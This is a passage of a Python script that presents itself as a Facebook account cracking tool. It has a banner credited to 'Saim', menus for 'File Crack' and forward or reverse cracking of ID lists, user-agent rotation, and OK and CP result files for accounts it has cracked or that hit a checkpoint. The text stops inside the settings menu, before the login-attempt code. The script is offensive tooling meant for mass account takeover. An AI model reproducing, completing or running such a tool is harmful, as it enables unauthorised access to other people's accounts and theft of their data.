import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('[✓] Internet Eror ,Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Aziz
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Aziz

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

x = '\033[93m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[92m'
u = '\033[95m'
kk = '\033[93m'
b = '\33[1;96m'
p = '\x1b[1;95m'
P = '\033[0;00m'
J = '\033[1;93m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[1;92m'
C ='\033[1;96m'
M ='\033[1;91m'
U ='\033[1;95m'
K ='\033[1;93m'
P='\033[00m'
h='\033[1;90m'
Q="\033[00m"
kk='\033[1;92m'
ff='\033[1;96m'
G='\033[1;96m'
p='\033[00m'
h='\033[1;90m'
Q="\033[00m"
I='\033[1;92m'
II='\033[1;96m'
m='\033[1;91m'
O ='\033[1;93m'
H='\033[1;93m'
b = '\033[1;96m'
war = "[•]"
B = random.choice([U,I,K,b,M])

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

my_id = '100007061760822'

def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
    
def clear():
	os.system('clear')
def back():
	menu()
def banner():
	clear()
	print("""%s\n\x1b[93;1m


 
  /$$$$$$   /$$$$$$  /$$$$$$ /$$      /$$
 /$$__  $$ /$$__  $$|_  $$_/| $$$    /$$$
| $$  \__/| $$  \ $$  | $$  | $$$$  /$$$$
|  $$$$$$ | $$$$$$$$  | $$  | $$ $$/$$ $$
 \____  $$| $$__  $$  | $$  | $$  $$$| $$
 /$$  \ $$| $$  | $$  | $$  | $$\  $ | $$
|  $$$$$$/| $$  | $$ /$$$$$$| $$ \/  | $$
 \______/ |__/  |__/|______/|__/     |__/
                                         
                                         
                                         
                               
                                

                      
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mSaim
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m$$$$$
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mTeam Cumfu
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
		
def menu(): #Bilo
	banner()
	print("") #Bilo
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	print("""%s \33[1;33m[1] File Crack  """%(h))
	print("""%s \33[1;33m[0] Exit"""%(h))
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	farhan = input(x+'\33[1;96m•Input Number> ')
	if farhan in ['1','01']:
		File2()
	elif farhan in ['0','00']:
		os.system("xdg-open https://youtube.com/c/TalhaTechnologychannel")
		exit()
	else:
		os.system("https://youtube.com/c/TalhaTechnologychannel")
		exit()

def File2():
			clear()
			banner()
			try:
				fileX = input ('\n [+] Enter file path : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit("\n [!] file %s not found"%(fileX))

def setting():
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	print("""%s \33[1;33m[01] Farward Cracking """%(h))
	print("""%s \33[1;33m[02] Reverse Cracking """%(h))
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	mubashar = input(x+'\33[1;96m•Input Number>')
	if mubashar in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif mubashar in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	
	else:
		print("""%s \33[1;33mRoung Input"""%(h))
		exit()
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	print("""%s \33[1;33m[01] B-Api (fast)"""%(h))
	print("""%s \x1b[92;1m<===================================>\x1b[92;1m """%(h))
	baloch = input(x+'\33[1;96m•Input Number> : ')
	if baloch in ['1','01']:
		method.append('api')
	else:
		method.append('api')
	print("""%s \x1b[9
